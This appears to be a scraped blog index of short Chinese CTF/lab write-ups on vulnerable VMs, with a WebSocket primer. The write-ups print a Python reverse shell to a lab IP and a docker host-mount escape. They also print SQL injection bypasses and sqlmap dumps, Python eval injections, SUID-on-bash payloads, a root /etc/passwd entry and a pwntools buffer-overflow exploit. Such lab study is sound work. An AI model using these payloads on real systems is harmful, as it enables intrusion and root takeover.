输入试试 - 发现不行 原来是进行了过滤我们修改抓包试试 可以看到这里的TYPE不是HTTP是WS 它们相互配合完成效果 成功 总结一下 # websocket技术是一个实时交互技术 他和 HTTP区别有吗？\nHTTP 协议的 “硬伤”：无法满足实时交互的核心需求 # ​\tHTTP 是 “请求 - 响应” 模式的协议，即使通过技术手段 “保持连接”（如 HTTP/1.1 的 Connection: keep-alive 持久连接），也无法突破其本质限制：\n通信方向受限：服务器不能主动发数据 HTTP 中，只有客户端主动发送请求（Request），服务器才能被动回应（Response）。服务器永远无法 “主动” 向客户端推送数据 —— 这是实时交互（如聊天、实时监控）的核心障碍。\n例如：如果用 HTTP 做聊天软件，A 给 B 发消息后，服务器无法主动通知 B “有新消息”，B 必须不断手动刷新（或客户端定时发请求）才能收到，体验极差。\n“保持连接” 不等于 “实时双向通信” HTTP/1.1 的 keep-alive 确实能让 TCP 连接复用（避免每次请求重新握手），但连接的控制权仍在客户端：\n客户端不发请求时，服务器无法利用这个连接 “主动说话”； 连接的超时时间由服务器或客户端控制（通常几秒到几分钟），到期后会自动断开，无法 “永久保持”。 轮询 / 长轮询的低效性 为了模拟 “实时性”，HTTP 场景下常采用两种妥协方案，但都有明显缺陷：\n轮询\n：客户端每隔几秒发一次请求（如 “有新消息吗？”），服务器回复 “有 / 没有”。\n问题：大量无效请求（比如 90% 的请求都是 “没有新消息”），浪费带宽和服务器资源；延迟高（至少等于轮询间隔）。 长轮询\n：客户端发请求后，服务器不立即回复，而是 “挂起” 请求，直到有数据时才响应（或超时后回复空），客户端收到后立刻再发新请求。\n问题：服务器需要维持大量 “挂起的请求”，消耗内存；超时机制仍会导致延迟；本质还是客户端 “被动等待”，而非服务器 “主动推送”。 websocket\u0026mdash;\u0026ndash;\n二、WebSocket 的核心价值：解决 HTTP 的 “被动性” # WebSocket 正是为解决上述问题而生，它的设计直接瞄准 “实时双向通信”：\n全双工通信：服务器和客户端可随时互发数据 WebSocket 连接建立后，客户端和服务器地位平等 —— 双方可以在任何时候主动向对方发送数据，无需等待对方请求。 例如：聊天场景中，A 发消息后，服务器可立即通过 WebSocket 主动推送给 B，B 无需任何操作就能实时收到。 一次握手，永久连接（按需） WebSocket 连接通过 HTTP 握手升级而来（仅一次 HTTP 请求），之后彻底脱离 HTTP 协议，基于纯 TCP 进行双向通信： 连接一旦建立，除非主动断开（客户端 / 服务器调用关闭），否则会一直保持； 数据传输时无需携带 HTTP 头部（仅少量 WebSocket 帧协议开销），比 HTTP 轮询高效 10 倍以上。 极低延迟和资源消耗 没有 HTTP 轮询的 “无效请求” 和 “头部冗余”（HTTP 头部通常几百字节到几 KB，WebSocket 帧头部仅 2-10 字节）； 服务器无需维持大量 “挂起的请求”，一个 WebSocket 连接即可支撑双向实时通信，资源占用极低。 WebSocket 的典型场景 # 正因为解决了 HTTP 的核心限制，WebSocket 成为实时交互场景的 “最优解”：\n即时通讯（聊天软件、客服系统）； 实时数据监控（股票行情、系统监控面板）； 协作工具（多人在线文档、白板）； 在线游戏（实时同步玩家操作和状态）； 直播弹幕、实时投票等。 HTTP 协议的设计初衷是 “客户端请求 - 服务器响应” 的单向交互，即使保持连接，也无法突破 “服务器不能主动推送” 的本质限制；而 WebSocket 专为 “双向实时通信” 设计，通过一次连接实现全双工数据传输，彻底解决了 HTTP 在实时场景下的低效和延迟问题。\n","date":"11 July 2025","externalUrl":null,"permalink":"/posts/portswigger-websocket-websocket-messages-to-exploit/","section":"Posts","summary":"","title":"websocket-messages-to-exploit-vulnerabilities","type":"posts"},{"content":"","date":"25 June 2025","externalUrl":null,"permalink":"/tags/docker%E9%80%83%E9%80%B8/","section":"Tags","summary":"","title":"Docker逃逸","type":"tags"},{"content":" language靶机\u0026mdash;难度easy知识点-docker逃逸-爆破 # Nmap扫描发现端口 80和9999 # 访问80没东西 就访问9999端口-结果是pikachu 那就直接RCE就行 但是他这里RCE 什么命令都没有或者限制了？ 试试其他的反弹\r127.0.0.1 | python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.1.126\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\r成功了 拿到shell权限 # 这里翻到了数据库密码 进去看看 这里翻到了一个用户叫ml 但是这里系统什么用户都没有 很奇怪啊 这里一开始就怀疑是docker容器里面 这里翻到了一些提示文件和判断是不是docker 判断是不是docker\r1：主机名字 输入字符返回长字符串\r2：ls /sys/fs/cgroup 这目录 是 Docker 和其他容器技术使用的cgroup（控制组）信息所在的目录。查看有无\r3：docker ps直接查看有无\r而且这靶机用户都没有很大几率在docker里面 然后我们获得用户同时那个提示证明密码有关用户名爆破就行\rcat /usr/share/wordlists/rockyou.txt | grep \u0026#39;^ml\u0026#39; \u0026gt; ml.txt 取出以ml开头的 拿root # 登录上去 发现.bash_history没有删除并且sudo -l 然后他启动了一个容器 没有 呃呃呃 这里做WP发现一个直接方法\rDocker 容器本身运行时默认是以 root 用户身份运行的（除非你明确指定以其他用户身份运行），所以容器内你会获得 root 权限。 这里说明下我在容器创建的123.txt 我在外面是看不到的他建立的容器没有和本身建立连接不能修改本身\r这里我做的直接挂载并且和本身建立连接 意思你修改容器也会修改源文件/\r这里我重新拿一个镜像docker run -v /:/mnt -it alpine chroot /mnt sh 并且在根目录创建文件hahaha.txt 我们退出到用户看看有没有 确实存在 所以我们写入.ssh就可以提权到本身的root里面 解释代码 - docker run -v /:/mnt -it alpine chroot /mnt sh docker run 用于启动一个新的容器并执行指定的命令\r-v /:/mnt -v表示挂载 /映射到/mnt目录\r-it -i 让容器保持交互模式，-t 给你一个终端。\rchroot /mnt sh 这里最关键步骤 容器里的命令执行环境就变成了宿主机的文件系统 相当于你“切换根”，从容器转到了宿主机上\rsh 执行一个 shell 在宿主机文件系统根目录中执行 /bin/sh 如何防范\r1：禁用容器挂载卷功能\r2：root开启镜像时候：Docker 容器默认会以 root 用户运行，如果没有特别限制，容器内的用户可以执行很多敏感操作\r可以\rdocker run --privileged=false -it ubuntu 禁用特权模式\r3：限制挂载目录\r关键点还是 不要直接将 Docker 权限直接给到用户手上 总结一下 # 1：如果用户有 Docker 权限，并且能够控制 Docker 容器，他们几乎能够绕过所有容器内的限制（包括文件系统权限），并直接访问宿主机资源。因此，防止将 Docker 权限授予非管理员用户是容器安全的基础。如果 Docker 权限无法被控制，其他的安全措施将显得非常脆弱。\n","date":"25 June 2025","externalUrl":null,"permalink":"/posts/language/","section":"Posts","summary":"","title":"language靶机---难度easy知识点-docker逃逸-爆破","type":"posts"},{"content":" hoshi靶机\u0026mdash;难度medium知识点-文件包含+表达式注入+盲水印 # Nmap扫描发现端口 80和22 # 我们先访问看看WEB什么效果 index.php 好吧又是经典的界面 现在看到这种界面就感觉难度不低 这里提交反馈会在下面生成在uploads文件夹生成你的文件名 我们再看admin.php\r这里需要密码 我们看看源码然后这里爆破了下都没发现什么 先放在这里 目录扫描到一个/robots.txt 文件我们访问看看 这里卡了很久问了下作者说是用盲水印 工具就选这个 bwm.py\rpython bwmforpy3.py decode MAZ.png int.png 123.png\r前面maz是原图 int是水印图 123.png是生成图片 我们访问目录 - 这里只有一个GIFT.PHP我们访问 这种看着就有点像带参数 我们FUZZ下\rwfuzz -w /usr/share/zidian/SecLists-2023.2/Discovery/Web-Content/common.txt -u http://IP/hoshi/gift.php?FUZZ=index.php --hl 0 他返回了index.php界面 也就是说可能是 文件包含 这里我有一个思路 不是一开始生成产生了txt文件吗 我们把txt文件包含不就行了 如图他只能包含html下的 不能出现/ .. 符号 有没有可能把txt文件放上来呢 这里我在名字前面加../果然他目录发生了变化不在uploads里面放到了html里面然后我去包含试试 看到上面就发现不行了txt里面需要完整php代码但是被实体化了肯定加载不了了\r都变成了文字 然后卡了很久问下下作者\r才想到密码文件还没用这里就是猜密码了 这里我用密码生成工具生成hoshi模板密码都没用\r然后试了域名 结果把客服电话放上去发现可以了 400-123-4567 但是吧也没注意什么这里又卡了几个小时吧\r然后问作者XD 结果发现了一个 这里你可以试试静态页面肯定就是html页面了 也就是说你生成的反馈文件会被admin.php生成admin.html\r但是HTML怎么执行系统命令呢 有PHP语句也不行啊 但是你忘了还有一个文件包含点了吗 而且我们文件名是随便取得 拿到shell权限 # 我们创建一个这样名字得反馈文件然后先访问admin.html看看有没有 访问admin.html 因为我们没有执行admin.php所以还没加载进去 访问看看是否加载了\n确实加载了我们得html应该也变了 我们再包含试试 可以看到成功执行\r接着我们上传一个\r\u0026lt;?php system($_GET[\u0026#34;a\u0026#34;]) ?\u0026gt; 然后反弹busybox\r成功拿到SHELL 这里有疑问\r1：你生成\u0026lt;?phhxxx?\u0026gt;文件你直接包含admin.php不行吗 1.1 admin.php生成的是html代码 - \u0026gt; 里面有php命令 但是被注释了 因为HTML代码会把PHP注释掉\r所以包含html里面会执行PHP代码 拿root # 这里家目录有一个welcome用户 但是要找密码\r在/var/backups 有一个shadow~ 使用john解码获得密码loveme2 然后登录 sudo一下这种一看就是NC访问 我们访问执行下 这里有一个日志可以看怎么执行得 这里猜出来很大概率是拼接 那我们可以表达式注入这里禁用了很多字符如| \u0026amp; ； 但是\u0026amp;\u0026amp;没有这里给出payload\rexec_cmd whoami\u0026#39; \u0026amp;\u0026amp; chmod +s /bin/bash \u0026#39;\rexec_cmd id\u0026#39; \u0026amp;\u0026amp; ls -al \u0026amp;\u0026amp; \u0026#39;\rexec_cmd whoami\u0026#39; $(chmod +s /bin/bash) \u0026#39; 总结一下 # 1：累死了 但是学到了\n","date":"23 June 2025","externalUrl":null,"permalink":"/posts/hoshi/","section":"Posts","summary":"","title":"hoshi靶机---难度medium知识点-文件包含+表达式注入+盲水印","type":"posts"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","section":"Tags","summary":"","title":"文件包含","type":"tags"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/","section":"Tags","summary":"","title":"盲水印","type":"tags"},{"content":"","date":"23 June 2025","externalUrl":null,"permalink":"/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"表达式注入","type":"tags"},{"content":" gigachad靶机\u0026mdash;难度easy知识点-nail # Nmap扫描发现端口开放 # 直接试FTP匿名访问\n得到一共URL我们访问下\n你问AI可以也可以识图\n这里得到密码maidenstower\n拿到shell权限 # 这里注意有一程序s-nail\n我们可以去msfconsole去搜PAYLOAD\n然后PYTHON传过去\n拿root # 提权成功\n总结一下 # ","date":"21 June 2025","externalUrl":null,"permalink":"/posts/gigachad/","section":"Posts","summary":"","title":"gigachad靶机---难度easy知识点-nail","type":"posts"},{"content":"","date":"21 June 2025","externalUrl":null,"permalink":"/tags/nail/","section":"Tags","summary":"","title":"Nail","type":"tags"},{"content":" yibasuo靶机\u0026mdash;难度easy知识点-nail # Nmap扫描发现端口开放 # 这里注意FTP版本2.3.4有一个笑脸RCE 当你执行如 root:)会开启端口\n但是你去NC会发现不行 可能是防火墙限制了本地访问\n直接试FTP匿名访问\n可以但是credit里面没有信息所以就不看了\n访问URL看下\n弱口令 password123 多试试字典\n后面\u0026hellip;代码没加载完嘛 然后试试busybox 可以\n拿到shell权限 # 进去看看有一个用户todd 然后看防火墙有本地连接限制我们本地连接就可以拿到权限\ncat /etc/iptables/rules.v4 拿root # 上面是标准下面是另一条弱口令路线‘ 通过模板生成用户名密码\nbash generate_by_username.sh todd \u0026gt; todd.txt 然后登录可以用bash\n总结一下 # 1：不要忘记弱口令爆破\n2：这里又了解一个CVE vtp的2.3.4漏洞\n","date":"21 June 2025","externalUrl":null,"permalink":"/posts/yibasuo/","section":"Posts","summary":"","title":"yibasuo靶机---难度easy知识点-nail","type":"posts"},{"content":"","date":"20 June 2025","externalUrl":null,"permalink":"/tags/sql%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"SQL注入","type":"tags"},{"content":" talk靶机\u0026mdash;难度easy知识点-SQL注入 # Nmap扫描发现端口开放 # 访问是一个聊天界面登录可以聊天\n这里并不能突破\n突破点在外面的登录框做了这么久不要忘记SQL注入了\n这里附上PAYLOAD\njerry\u0026#39; or 1=1 -- jerry\u0026#39; or 1=1 #\r# 是最可靠的特殊情况注释方案\r-- (带空格) 是最安全、兼容性最好的标准注释方式\r--+ 依赖 Web 服务器的 URI 解码特性\r这里密码不用输入了因为sql注入修改了SQL语句\rWHERE username = \u0026#39;admin\u0026#39; -- 注释了后面的密码\u0026#39; AND password = \u0026#39;任何密码\u0026#39;\rPOST /login.php HTTP/1.1\rHost: 172.20.10.3\rOrigin: http://172.20.10.3\rReferer: http://172.20.10.3/index.php?registered\rCookie: PHPSESSID=0l25og4fd06guunjegg65raeb0\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\rAccept-Language: zh-CN,zh;q=0.9\rUpgrade-Insecure-Requests: 1\rAccept-Encoding: gzip, deflate\rContent-Length: 44\rusername=jerry*\u0026amp;password=1\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-db\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-db --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --tables -D \u0026#34;chat\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T \u0026#34;user\u0026#34; -D \u0026#34;demo01\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T \u0026#34;user\u0026#34; -D \u0026#34;chat\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --dump -C \u0026#34;username,password,userid\u0026#34; -T \u0026#34;user\u0026#34; -D \u0026#34;chat\u0026#34; 获取密码我们跑就行\n拿到shell权限 # 拿root # 也可以拿公钥\n总结一下 # 1：别忘了SQL注入\n","date":"20 June 2025","externalUrl":null,"permalink":"/posts/talk/","section":"Posts","summary":"","title":"talk靶机---难度easy知识点-SQL注入","type":"posts"},{"content":" matrix靶机\u0026mdash;难度easy知识点-表达式注入 # Nmap扫描发现端口开放 # 我们访问看下80没用 我们看5000这里注入下这个输入框\n这里输入引号直接报错了我们可以试试表达式注入因为是一python脚本\n这里试试PAYLOAD\n\u0026#39; + __import__(\u0026#34;os\u0026#34;).popen(\u0026#34;whoami\u0026#34;).read() + \u0026#39; 这里给出源码\ndef dynamic_execute(type_str, expression):\rcommand = \u0026#34;%s\u0026#39;%s\u0026#39;\u0026#34;%(type_str,expression) # 拼接出要执行的命令\rprint(command)\rreturn eval(command) # 执行拼接后的命令\r@app.route(\u0026#39;/message\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;])\rdef handle_message():\rif request.method == \u0026#39;GET\u0026#39;:\rreturn render_template(\u0026#39;message.html\u0026#39;) # 渲染留言页面\relse:\rmessage_type = request.form[\u0026#39;type\u0026#39;][:1] # 获取留言类型\ruser_message = request.form[\u0026#39;msg\u0026#39;] # 获取用户留言内容\rusername = \u0026#34;Guest\u0026#34; # 默认用户名为 Guest\rresult = dynamic_execute(message_type, user_message) # 动态执行用户输入的内容\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=result, status=f\u0026#39;{username},留言成功\u0026#39;)\r### 我们输入这个\u0026rsquo; + import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read() + \u0026rsquo; 是msg的\n则数据是\nu\u0026rsquo;import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read()\u0026rsquo; 则执行这个代码 uicode就是string类型所以成功执行\n放入进去是u\u0026rsquo;\u0026rsquo; + import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read() + \u0026rsquo;\u0026rsquo; = 但是在python2里面前面放入unicode可以但是在py3中会Unicode未定义可能依赖里面设置了可以\n或者[type][1][1]这里获取的是第一个字符也就是说你输入unicode=u 那么你输入f是不是格式化输出呢\n所以又一个PAYLOAD\nmsg={os.system(\u0026#34;whoami\u0026#34;)}\u0026amp;type=f 所以总结下 两种\nmsg={os.system(\u0026ldquo;whoami\u0026rdquo;)}\u0026amp;type=f 格式化输出\nmsg=\u0026rsquo;+(os.popen(\u0026ldquo;pwd\u0026rdquo;).read()+\u0026rsquo;\u0026amp;type=unicode 拼接替换\n拿到shell权限 # 发现ROOT也有开了一共服务本地可以访问的8000端口\n这里通过socat转发代码如下\n./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:8000 \u0026amp; 而且还给了源码我们来分析下\n注意注意 这里我们PAYload不能用unicode的那个了因为过滤了空格不能闭合了 我们用第二个可以读取\ndef dynamic_execute(type_str, expression):\rcommand = \u0026#34;%s\u0026#39;%s\u0026#39;\u0026#34;%(type_str,expression) # 拼接出要执行的命令\rprint(command)\rreturn eval(command) # 执行拼接后的命令\r@app.route(\u0026#39;/message\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;])\rdef handle_message():\rif request.method == \u0026#39;GET\u0026#39;:\rreturn render_template(\u0026#39;message.html\u0026#39;) # 渲染留言页面\relse:\rmessage_type = request.form[\u0026#39;type\u0026#39;][:1] # 获取留言类型\ruser_message = request.form[\u0026#39;msg\u0026#39;] # 获取用户留言内容\rusername = \u0026#34;Guest\u0026#34; # 默认用户名为 Guest\rif len(user_message) \u0026gt; 35: # 如果留言太长\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=\u0026#39;留言太长了！\u0026#39;, status=\u0026#39;留言失败\u0026#39;)\ruser_message = user_message.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;_\u0026#39;, \u0026#39;\u0026#39;) # 移除空格和下划线\rresult = dynamic_execute(message_type, user_message) # 动态执行用户输入的内容\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=result, status=f\u0026#39;{username},留言成功\u0026#39;)\r### 但是这里有长度限制我们可以\nchmod +s /biin/bash \u0026gt;a 给到tmp文件下a 文件然后执行\n拿root # 这里群主给了另一方法\n修改etc/passwd权限通过 0o666表示八进制 linux里面权限也是八进制所以权限是rw-rw-rw\n发现可写了\npayload 密码123456\necho \u0026#39;ll:$y$j9T$ExvEUV2wz6oo99qy/ZJc61$4CBi7jCbWQ.pBlG9vmnhH0z3.uchXkOXaFIl9Zz5Y18:0:0:xxoo,,,:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd 总结一下 # 1：多学学python\n","date":"19 June 2025","externalUrl":null,"permalink":"/posts/matrix/","section":"Posts","summary":"","title":"matrix靶机---难度easy知识点-表达式注入","type":"posts"},{"content":" insomnia靶机\u0026mdash;难度easy知识点-分号截断 # Nmap扫描发现端口开放 8080然后我们访问看下是什么 # NMAP扫描 我们访问发现一个网页感觉没什么关键地方\n这里我们注意下！ 我们扫这网站因为他404也返回200导致扫描工具不能用 我们可以设置不要返回那个数字来避免 NMAP扫描 比如gobuster\ngobuster dir -u http://172.20.10.2:8080 \\\r-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\r-x php,txt \\\r--exclude-length 2899 避免长度2899的显示我们发现三个文件\nNMAP扫描 其中关键的文件是这个administration.php\nNMAP扫描 关于这个主页面不是你输入什么然后显示什么吗 然后我试了很多比如\n1：SQL注入 2：SSRF\n3：模板注入\n都不行 然后 很奇怪的就来了 我直接用gobuster扫描发现你\n每当你扫描一次他会往对话框放入都是都是空格 这里各位大佬应该都有思路了 用FUZZ下\nNMAP扫描 然后我们发现了一个logfile文件我们加上参数过去果然啊 我输入1聊天就显示1\nNMAP扫描 然后我试了很多比如logfile=\u003c?php phpinfo()?\u003e 都不行\n然后我们可以试试用sleep来看是不是没有回显比如\nlogfile=;sleep 5; 发现真的延迟了然后直接busybox nc 反弹shell\n拿到shell权限 # 我们拿到SHELL可以看看源码\nNMAP扫描 发现是直接拼接\n我们用linpeas跑一下发现可以用这个sh文件 而且这文件是我们可以写的那就很简单了\nNMAP扫描 文件写入/bin/bash 然后拿到julia\nNMAP扫描 拿root # 因为可以看bash_history我们看下历史记录发现了再往定时任务反弹\nNMAP扫描 然后我们使用下面程序来查看发现可以有一个sh文件被ROOT用户用/bin/bash来运行\npspy64 /bin/sh -c /bin/bash /var/cron/check.sh\n用sh来执行命令\nNMAP扫描 而且这文件我们可写\n我们直接往里面写入命令如\nchmod +s /bin/bash 发现成功拿到SUID权限\n提权成功\n/bin/bash -p 总结一下 # 1：多用用；截断 ,多观察联动性\n","date":"17 June 2025","externalUrl":null,"permalink":"/posts/insomnia/","section":"Posts","summary":"","title":"insomnia靶机---难度easy知识点-分号截断","type":"posts"},{"content":" pwn-tools first - 第一次 # 这里因为我也是第一次玩PWN的题目所以也是看群主的视频来学习 先看步骤后面总结会解释\n然后我们NC下 试试发现是一个NC 这里要输入250次经过测试\n这里你可以写PY脚本 也可以用 PWN\n这里附上代码\nfrom pwn import *\rimport re\rr=remote(\u0026#34;172.20.10.2\u0026#34;,1337)\rfor i in range(250):\rprint(i)\ra = r.recvuntil(b\u0026#39;: \u0026#39;).decode()\rprint(a)\rx = re.split(\u0026#39;/[|/]\u0026#39;,a)\rr.sendline(x[1].encode())\rr.interactive() 拿到密码得到SHELL\n然后这里程序我们先把发送出来 然后IDEA反编译下\n得到主函数然后左边有一个fun 函数点开看看\n发现了要利用的函数因为主函数有一个gets没有检测输入个数我们利用下栈溢出\n栈溢出代码如下\n代码如下\nfrom pwn import *\rimport re\rr=remote(\u0026#34;172.20.10.2\u0026#34;,12345)\rjunk = b\u0026#39;A\u0026#39; * 23\rfun = p64(0x401186)\rpayload = junk + fun\rr.recvuntil(b\u0026#39;please input/n\u0026#39;)\rr.sendline(payload)\rr.interactive() 拿到ROOT\n我们拿到了ROOT我来解释下原理\n当你不停的往这个数组放入数值时 满的时候他会到缓冲区拿去数据 我们就是来控制缓冲区的数据找到那个临界值爆发后我们控制的值 我们上面图算出来了是23\n如何计算？\n使用\npwndbg /opt/find_backdoor r 然后输入一长串有规则数据生成可以使用代码\npython3 -c \u0026#34;from pwn import cyclic; print(cyclic(100))\u0026#34; b\u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\u0026#39; 然后我们放入进去\n可以看爆出了 ret\n下面那个6161686161616761是爆发值\n然后我们使用工具来看偏移量是多少\npython3 -c \u0026#34;from pwn import *; print(cyclic_find(0x6161686161616761))\u0026#34; 算出23 所以我们POC代码就是23个A加上函数地址\n总结一下 # 1：从输入的哪一位开始，覆盖了返回地址（RIP）\n2：当你利用栈溢出攻击程序时：你要精确填满前面的内容，刚好覆盖返回地址所以必须知道这个“偏移值”\n","date":"17 June 2025","externalUrl":null,"permalink":"/posts/tool-pwn/","section":"Posts","summary":"","title":"pwn-tool","type":"posts"},{"content":"","date":"17 June 2025","externalUrl":null,"permalink":"/tags/%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD/","section":"Tags","summary":"","title":"分号截断","type":"tags"},{"content":" Locker靶机\u0026mdash;难度easy知识点-分号截断,Sulogin # Nmap扫描发现端口开放 # NMAP扫描 我们访问发现一个网页感觉没什么关键地方\nNMAP扫描 这里穿越啊 注入啊 包含 都不行\nNMAP扫描 结果使用分号截断\nNMAP扫描 所以平时多用分号没问题\n拿到shell权限 # 我们到web权限查看发现一个sulogin\nNMAP扫描 sulogin: 用于 单用户模式下获取 root 权限 如\n系统故障修复（如忘记 root 密码时重置密码）。 维护模式下执行特权操作（需通过安全验证）。 它可以直接读取环境变量里面的值\n例如：export SUSHELL=/tmp/恶意程序 \u0026amp;\u0026amp; sulogin 会直接执行 /tmp/恶意程序。\n工具 环境变量依赖 执行逻辑 安全设计目的 sulogin 仅依赖 自定义变量 直接执行指定路径的程序 避免被 PATH 注入恶意程序 cat 等命令 依赖 PATH 按 PATH 顺序搜索可执行文件 提供用户自定义路径的灵活性 拿root # 我们用老版本的C语言编写一个设置系统命令的代码\nC语言代码\n#include\u0026lt;stdio.h\u0026gt; // 基础输入输出库\r#include\u0026lt;stdlib.h\u0026gt; // 提供 system() 等函数，用于执行系统命令\r#include\u0026lt;unistd.h\u0026gt; // 提供 setuid()、setgid() 等系统调用\rint main(){\rsetuid(0); // 将进程的有效用户 ID 设置为 0（root 用户的 UID）\rsetgid(0); // 将进程的有效组 ID 设置为 0（root 组的 GID）\rsystem(\u0026#34;/bin/bash\u0026#34;); // 执行 /bin/bash，启动一个新的 Shell\r} NMAP扫描 为什么要建立C文件\n区别：C 程序通过 setuid(0) 直接修改进程权限，而 Shell 脚本依赖外部机制（如 SUID 权限）间接提权。 我们WGET下来添加X 后 记得导入环境变量SUSHELL是我自定义的变量他会优秀读取后读/etc/passwd的root\nNMAP扫描 总结一下 # 1：多用用；截断\n2：sulogin是 Linux 系统中专门用于单用户模式的登录程序，路径为/sbin/sulogin。当系统进入单用户模式时，会自动调用 sulogin`，要求用户输入 root 密码（部分旧系统可直接进入）。 这靶机把root锁定了不能SU ROOT 感叹号可以把root锁定在/etc/shadow里面\nroot:!:18649:0:99999:7::: # 表示 root 被锁定 本身可以-e 获得权限可能被锁定了就不行\nSUSHELL是sulogin调用的另一个环境变量 手动指定就行\n3：单用户模式是操作系统的一种特殊启动状态，仅允许一个超级用户（root）登录系统，且不加载网络服务、图形界面等非必要组件\n4：sulogin 和 path 的区别\n​\t4.1sulogin 会执行你的命令 安全风险- 依赖 PATH 可能引入路径遍历风险\n​\t4.2path会找命令的程序找到就执行 比如 CAT他就会在如BIN里面找 安全风险 - 环境变量修改\n","date":"12 June 2025","externalUrl":null,"permalink":"/posts/locker/","section":"Posts","summary":"","title":"Locker靶机---难度easy知识点-分号截断,Sulogin","type":"posts"},{"content":"","date":"12 June 2025","externalUrl":null,"permalink":"/tags/sulogin/","section":"Tags","summary":"","title":"Sulogin","type":"tags"},{"content":" vulny靶机\u0026mdash;难度easy知识点-file-manager # Nmap扫描发现端口开放 # 3333端口和一个mysql 我们上去网页 我先测试的无密码访问是不行的然后我们访问网页\nNMAP扫描 这里发现我们输入什么他就显示什么比如你输入123就在home的123 可以试试看目录穿越但是没出来 我们得到了一个思路 爆破用户名呗\nNMAP扫描 这里我用dirsearch 扫描出来有一个secret目录\nNMAP扫描 但是还是什么都没有 因为dirsearch扫描很多wordpress我就用Nuclei扫描了下发现了一个CVE\nNMAP扫描 利用链接：CVE-2020-25213 WordPress远程代码执行漏洞复现 - Salvere - 博客园\n利用这个CVE上传文件然后访问试试\nNMAP扫描 NMAP扫描 然后就很简单的反弹就行\n拿到shell权限 # 拿到我马上就去翻web-config这是wordpress的配置文件因为 他有mysql 然后 我肯定先去看看 结果翻了20分钟 没发现 看了眼WP结果..是注释\n在/usr/share/wordpress/wp-config.php 文件 居然是注释 真没看到\nNMAP扫描 拿root # NMAP扫描 很简单FLOCK 直接可以搜到\nhttps://gtfobins.github.io/gtfobins/flock/#sudo\nsudo flock -u / /bin/sh NMAP扫描 总结一下 # 1：多看看注释吧\n2：CVE-wp-file-manager 这是一个插件 在web你可以下载还可以看到源码 影响版本 6.0-6.8\n3：flock 是 Linux 系统中用于文件锁定的命令 -u 表示解锁 文件 -c 也可以执行命令如\nsudo /usr/bin/flock /tmp/mylock -c \u0026#34;cat /root/root.txt\u0026#34; ","date":"12 June 2025","externalUrl":null,"permalink":"/posts/vulny/","section":"Posts","summary":"","title":"vulny靶机---难度easy知识点-file-manager","type":"posts"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/fuzz/","section":"Tags","summary":"","title":"Fuzz","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/ln/","section":"Tags","summary":"","title":"Ln","type":"tags"},{"content":" observe靶机\u0026mdash;难度low知识点-fuzz # 只做了WEB 后面linux的苦手了\nNmap扫描发现端口开放 # 3333端口和一个SSH我们上去网页\nNMAP扫描 这里发现我们输入什么他就显示什么比如你输入123就在home的123 可以试试看目录穿越但是没出来 我们得到了一个思路 爆破用户名呗\nNMAP扫描 我们使用FUZZ来爆破下用户名 后缀就写.bash_history 用户名jan\nwfuzz -w /usr/share/zidian/SecLists-2023.2/Usernames/xato-net-10-million-usernames.txt -u http://172.20.10.2:3333/FUZZ/.bash_history \u0026ndash;hw 8\nNMAP扫描 网页查看下\nNMAP扫描 然后读下ssh的公钥我们直接登录\nNMAP扫描 拿到shell权限 # NMAP扫描 这里有一个systemctl 但是我没法提权后面看WP了\n拿root # 这里有一个ROOT进程的observe进程 我们的那个网页就是用root运行的 我们可以直接用网页来读取\nNMAP扫描 NMAP扫描 NMAP扫描 总结一下 # 1：多看看进程\n2：软连接命令 ln -sv /root xxoo\n","date":"11 June 2025","externalUrl":null,"permalink":"/posts/observer/","section":"Posts","summary":"","title":"observe靶机---难度low知识点-fuzz-ln","type":"posts"},{"content":"","date":"3 June 2025","externalUrl":null,"permalink":"/tags/base64/","section":"Tags","summary":"","title":"Base64","type":"tags"},{"content":" flower靶机\u0026mdash;难度low知识点-base64-py # 多思考\nNmap扫描发现端口开放 # 这里只有一个80我们上去发现是一个点击后显示花瓣的文件 